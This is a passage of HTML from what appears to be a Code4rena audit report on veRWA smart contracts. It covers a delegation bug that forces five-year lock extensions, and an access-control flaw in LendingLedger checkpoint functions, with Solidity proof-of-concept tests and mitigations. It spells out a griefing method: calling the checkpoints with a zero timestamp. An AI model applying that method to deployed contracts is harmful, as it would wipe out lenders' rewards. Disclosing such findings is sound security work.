href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/375\">kaden</a>, nonseodion (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/369\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/344\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/362\">Watermelon</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/312\">RandomUser</a>, BenRai (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/230\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/225\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/224\">cducrest</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/212\">Topmark</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/209\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/178\">0xDING99YA</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/82\">Kow</a></em></p>\n<p>Due to a check requiring users only be able to delegate to others or themselves with longer lock times and verwa’s restrictions of all changes increasing lock times by 5 years users may be forced to remain delegated to someone they do not wish to be or extend their lock much longer than they wish.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If a user does not delegate to another user who started their lock during the same epoch they will be unable to undelegate back to themselves without extending their own lock. This is not much of an issue if they wish to do so early in the lock period but can become a problem if they wish to delegate to themselves after a longer period of time. i.e.</p>\n<ol>\n<li>Bob creates lock in week 1.</li>\n<li>Dave create lock in week 2 &#x26; Bob delegates to Dave.</li>\n<li>3 years pass and Bob decides he wishes to undelegate his votes back to himself and calls delegate(msg.sender) but the call will fail due to the check in VotingEscrow#L384:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">fromLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only delegate to longer lock&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ol start=\"4\">\n<li>In the original FiatDAO contracts a user would be able to just extend their lock by one week to get around this however any changes in the verwa contract results in an extension of 5 years which the user may not want extend their lock by such a long time just to be able to undelegate.</li>\n</ol>\n<p>The undelegate fail can be shown by modifying the test testSuccessDelegate to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSuccessDelegate</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// successful delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">testSuccessCreateLock</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// warp more than 1 week so both users are not locking in same epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">LOCK_AMT</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">LOCK_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , , </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">locked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , </span><span class=\"mtk12\">int128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegated</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">locked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2000000000000000000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>and running:<br>\nforge test <code>--match testSuccessUnDelegate</code></p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify VotingEscrow#L384 to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">locked_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only delegate to self or longer lock&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which will allow users to delegate either to longer locks or undelegate back to themselves.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/182#issuecomment-1696857059\">alcueca (Judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>I’m merging <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/245\">#245</a> into this one as the root cause and general mechanics are the same, only that in the 245 group the intent was malicious and in this group is not.</p>\n<p>At the same time, I’m upgrading the severity to High. Locking CANTO for an additional 5 years, considering that this is by nature a volatile environment, has an extremely high chance of resulting in losses due to market movements or other factors.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/178\">OpenCoreCH (veRWA) confirmed on duplicate 178</a></strong></p>\n<hr>\n<h2 id=\"h-07-lack-of-access-control-in-lendingledgersolcheckpoint_lender-and-function-checkpoint_market\" style=\"position:relative;\"><a href=\"#h-07-lack-of-access-control-in-lendingledgersolcheckpoint_lender-and-function-checkpoint_market\" aria-label=\"h 07 lack of access control in lendingledgersolcheckpoint_lender and function checkpoint_market permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/142\">[H-07] lack of access control in <code>LendingLedger.sol#checkpoint_lender</code> and function <code>checkpoint_market</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/142\">ladboy233</a></em></p>\n<p><em>Note: This audit was preceded by a <a href=\"https://code4rena.com/test-coverage\">Code4rena Test Coverage competition</a>. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [H-07] was discovered during that period and is being included here for completeness.</em></p>\n<p>User’s claim and <code>sync_lender</code> will be griefed at low cost.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/// @notice Trigger a checkpoint explicitly.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _market Address of the market</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkpoint_market</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_market</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_forwardTimestampLimit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">is_valid_epoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_forwardTimestampLimit</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">lendingMarketTotalBalanceEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;No deposits for this market&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_checkpoint_market</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_forwardTimestampLimit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _market Address of the market</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _lender Address of the lender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkpoint_lender</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_market</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_forwardTimestampLimit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">is_valid_epoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_forwardTimestampLimit</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">lendingMarketBalancesEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_lender</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;No deposits for this lender in this market&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_checkpoint_lender</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_forwardTimestampLimit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details><br>\n<p>These two functions lack access control, the caller is never validated, meaning anyone can call this function.</p>\n<p>The market is not validated to see if the market is whitelisted or not.</p>\n<p>The timestamp is never validated, the is_valid_epoch(_forwardTimestampLimit) is insufficient.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _timestamp Timestamp to check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">is_valid_epoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_timestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_timestamp</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_timestamp</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Invalid timestamp&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The user can just pick a past timestamp as the _forwardTimestampLimit.</p>\n<p>For example, if we set _forwardTimestampLimit to 0.</p>\n<p>Then for example in _checkpoint_market</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_checkpoint_market</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_market</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_forwardTimestampLimit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currEpoch</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lendingMarketTotalBalanceEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currEpoch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_forwardTimestampLimit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">currEpoch</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Fill in potential gaps in the market total balances history</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastMarketBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lendingMarketTotalBalance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">][</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">lastMarketUpdateEpoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">WEEK</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">lendingMarketTotalBalance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">lastMarketBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lendingMarketTotalBalanceEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We set the lendingMarketTotalBalanceEpoch[_market] to 0.</p>\n<p>Then if the next call of the _checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0.</p>\n<p>Over time, even when the for loop inside _checkpoint_market does run, the caller are forced to pay very high gas fee.</p>\n<p>Same issue applies to _checkpoint_lender as well.</p>\n<p>User can decrease lendingMarketBalancesEpoch, even to 0.</p>\n<p>Basically, if a malicious actor call these two function with forwardTimestampLimit 0.</p>\n<p>Then the _checkpoint_lender and _checkpoint<em>market would never run inside sync\\</em>ledger and claim reward.</p>\n<p>Because user’s reward can be griefed to 0 and stated are failed to updated properly.</p>\n<p><strong>POC 1:</strong></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testLackOfAccessControlSyncMarket_POC_1</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint248</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountPerEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">5</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> 